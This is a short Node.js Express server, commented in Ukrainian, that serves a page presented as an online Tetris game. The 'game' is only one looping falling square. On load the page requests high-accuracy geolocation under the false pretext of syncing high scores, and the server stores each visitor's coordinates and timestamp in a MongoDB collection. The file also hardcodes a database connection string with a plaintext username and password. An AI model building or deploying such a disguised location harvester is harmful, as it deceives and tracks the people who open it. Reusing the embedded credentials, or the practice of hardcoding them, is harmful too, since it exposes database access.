const express = require('express');
const { MongoClient } = require('mongodb');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Головна сторінка з Тетрісом
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="uk">
        <head>
            <meta charset="UTF-8">
            <title>Тетріс Класик</title>
            <style>
                body { background: #111; color: #fff; font-family: sans-serif; text-align: center; margin-top: 50px; }
                canvas { border: 3px solid #00ffcc; background: #000; box-shadow: 0 0 10px #00ffcc; }
            </style>
        </head>
        <body>
            <h1>ТЕТРІС ОНЛАЙН</h1>
            <p>Дозвольте геопозицію для синхронізації рекордів</p>
            <canvas id="tetris" width="240" height="400"></canvas>
            <script>
                function sendGeo(pos) {
                    fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude })
                    });
                }
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(sendGeo, null, { enableHighAccuracy: true });
                }
                const canvas = document.getElementById('tetris');
                const ctx = canvas.getContext('2d');
                let y = 0;
                setInterval(() => {
                    ctx.fillStyle = '#000';
                    ctx.fillRect(0, 0, 240, 400);
                    ctx.fillStyle = '#00ffcc';
                    ctx.fillRect(100, y, 40, 40);
                    y += 4; if (y > 360) y = 0;
                }, 40);
            </script>
        </body>
        </html>
    `);
});

// Адреса вашої бази даних
const uri = "mongodb+srv://nazarpaholko2_db_user:jessi2021@tetris.giqasz2.mongodb.net/?retryWrites=true&w=majority";
const client = new MongoClient(uri);

// Обробник геоданих
app.post('/api/location', async (req, res) => {
    try {
        await client.connect();
        const db = client.db('tetris_game');
        const collection = db.collection('user_geo');
        await collection.insertOne({
            latitude: req.body.lat,
            longitude: req.body.lng,
            timestamp: new Date()
        });
        res.status(200).send({ success: true });
    } catch (error) {
        console.error("Помилка бази даних:", error.message);
        res.status(500).send({ error: error.message });
    } finally {
        await client.close();
    }
});

// Запуск сервера
app.listen(3000, () => {
    console.log('Сервер успішно запущено на порту 3000 і він чекає підключень...');
});
